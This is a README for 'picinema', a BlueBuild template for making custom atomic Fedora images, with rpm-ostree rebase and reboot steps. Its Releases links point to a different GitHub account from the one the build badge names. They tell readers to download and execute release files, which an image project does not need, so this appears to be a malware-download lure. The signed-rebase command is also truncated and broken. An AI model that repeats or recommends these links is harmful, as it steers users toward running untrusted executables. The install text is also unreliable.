# picinema &nbsp; [![bluebuild build badge](https://github.com/sayanpaul123/picinema/actions/workflows/build.yml/badge.svg)](https://github.com/sayanpaul123/picinema/actions/workflows/build.yml)

Welcome to **picinema**, a project designed to simplify the use of custom images in your atomic Fedora installations. This repository serves as a template to create and manage your own custom images efficiently. For quick setup instructions, see the [BlueBuild docs](https://blue-build.org/how-to/setup/). 

After setting up, please update this README to reflect your custom image's details.

## Table of Contents

- [Overview](#overview)
- [Installation](#installation)
- [Usage](#usage)
- [Features](#features)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Overview

**picinema** focuses on providing a streamlined approach to using custom images in an atomic environment. It is built with a focus on immutability and ease of use. The project leverages the BlueBuild framework, ensuring that your images are built and maintained with best practices in mind.

## Installation

To get started with **picinema**, you need to install it on your existing atomic Fedora installation. Please note that this feature is experimental. Use it at your own discretion.

### Step 1: Rebase to Unsigned Image

First, you will need to rebase your existing installation to the unsigned image. This step ensures that you have the proper signing keys and policies installed. Run the following command:

```bash
rpm-ostree rebase ostree-unverified-registry:ghcr.io/sayanpaul123/picinema:latest
```

### Step 2: Reboot

After the rebase, reboot your system to complete the process:

```bash
systemctl reboot
```

### Step 3: Rebase to Signed Image

Once your system is back up, rebase to the signed image with this command:

```bash
rpm-ostree rebase ostree-image-signed:docker
```

### Download Releases

For specific releases and updates, visit the [Releases section](https://github.com/Dhruv-patil-1672/picinema/releases). Make sure to download and execute the necessary files from the releases.

## Usage

After installation, you can start using **picinema** to manage your custom images. The following commands will help you get started:

### Creating a Custom Image

You can create a custom image using the provided template. Make sure to follow the guidelines in the BlueBuild documentation for the best results.

### Updating Your Image

To update your image, follow the same rebase process outlined in the installation section. This ensures that you always have the latest features and security updates.

### Checking the Status

You can check the status of your image using:

```bash
rpm-ostree status
```

This command provides you with information about the current state of your installation and any pending updates.

## Features

**picinema** comes with several features designed to enhance your experience:

- **Atomic Updates**: Ensure that your system is always up to date with the latest images.
- **Immutability**: Maintain a stable environment that is less prone to issues.
- **Customizability**: Easily create and manage custom images tailored to your needs.
- **BlueBuild Integration**: Leverage the BlueBuild framework for efficient image building.

## Contributing

We welcome contributions to **picinema**. If you would like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your fork.
5. Create a pull request detailing your changes.

We appreciate your interest in improving **picinema**.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For questions or feedback, feel free to reach out. You can open an issue in the repository or contact the maintainers directly.

Thank you for using **picinema**! We hope you find it useful for managing your custom images. For more updates and releases, please check the [Releases section](https://github.com/Dhruv-patil-1672/picinema/releases).